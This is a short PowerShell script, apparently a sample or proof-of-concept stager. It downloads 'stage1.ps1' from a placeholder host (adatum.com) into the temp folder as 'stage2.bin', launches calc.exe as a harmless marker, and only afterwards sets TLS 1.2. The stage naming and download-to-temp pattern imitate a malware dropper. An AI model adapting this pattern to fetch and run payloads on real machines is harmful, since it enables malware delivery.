
[CmdletBinding()]
param(
    [string]$DownloadUrl = 'http://adatum.com/stage1.ps1',
    [string]$OutputPath = "$env:TEMP\stage2.bin",
    [int]$TimeoutSec = 156
)
Invoke-WebRequest -Uri $DownloadUrl -OutFile $OutputPath -UseBasicParsing
Start-Process -FilePath "calc.exe"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
